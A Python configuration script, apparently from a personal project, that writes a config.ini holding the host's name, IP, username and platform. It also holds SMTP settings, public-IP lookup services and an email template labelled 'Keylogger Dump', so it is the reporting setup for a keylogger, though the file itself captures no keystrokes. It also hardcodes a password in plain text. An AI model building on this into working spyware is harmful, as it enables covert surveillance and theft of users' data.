#COnfiguration file test


### CHANGE
#If new version, update everything on the system - config, good_life.mp3/txt
#What happened at 17:05 that I got hundreds of emails.
#Use Github
#Fisrt Run info. -Whre downloaded from, executed as, lcoation, etc.etc.etc.



#importing parser
from configparser import ConfigParser
#Getting current time and date modules
from datetime import datetime
#Importing socket to get host IP/name
import socket
#Blank out password library
from getpass import getpass
#Import base64 for encodign password
import base64
import os
import platform


#Declaring config file.
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
host_username =  os.getlogin()
host_platform = platform.platform()

logDir = (r".")

try:
    config = ConfigParser()
    def createINI():
        #Getting teh current time.
        firstRunTime = datetime.now()
        #These are the default variables. they can be changed if user wants.
        config['DEFAULTS'] = {
            'Install Date & Time: ': firstRunTime,
            'Host Machine Name: ': host_name,
            'Host Machine IP: ' : host_ip,
            'Host Username: ' : host_username,
            'Host Platform: ' : host_platform,
            'Subject': '!!!! Keylogger Dump!!!!',
            'Email Body': ("""
              Keyloger Info and Dump:
              Title: {}
              Host Name: {}
              Host IP: {}
              Host Username: {}
              Host Platform: {}
              API Host Used: {}
              OLD Public IP: {}
              NEW Public IP: {}\n 
              \nThank you For Using GetPubIP & IntruderDetect from K&M Inc.""")#.format(previousIP, currentPublicIP))

        }

        config['database'] = {}
        database = config['database']
        #Setting all the variables.
        #print("\nThe next few questions will help you setup your emailing notification service.\nPressing \"Enter\" on some questions will result in default values: \n")
        database['When To Send Email'] = '10:35'
        database['Email Now'] = 'False'
        database['First Run'] = 'True'
        database['5min Email'] = 'True'
        database['30min Email'] = 'True'
        database['Send Email To'] = ''
        database['Sending Email'] = ''
        #Getting input from user for SMTP Auth Pass - Secure entry and Base64 Encoding for storage.
        #Gets the password twice and makes sure they are the same string. If not loop repeats.

        emailPass = 'HelloThisIsAnEmailServer'
        #Done with Password
        database['SMTP Server'] = ''
        database['SMTP Server Port'] = '465'
        database['From Email'] =  ''
        database['To Email'] =  ''

        database['IPv4 API #1'] = 'https://v4.ident.me/'
        database['IPv4 API #2'] = 'https://icanhazip.com/'
        database['IPv4 API #3'] = 'https://ifconfig.me/ip'
        #print("\nThank You, You have succefully completed the Initial Configuration.\nYou may change anything you wish by either running this script again or directly changing the 'config.ini' file.")

        #Writing congiurations to file.
        with open(logDir + '\config.ini','w') as configfile:
            config.write(configfile)
 
except Exception as error:
    print("ConfigFile could not be finished: {}".format(error))
#print(__name__)
#Running Only this code if this file is so - That way user can re-run config program.
if __name__ == "__main__":
    #Running the function to test. Leave commenetd when packaging file.
    createINI()
    #print(__name__)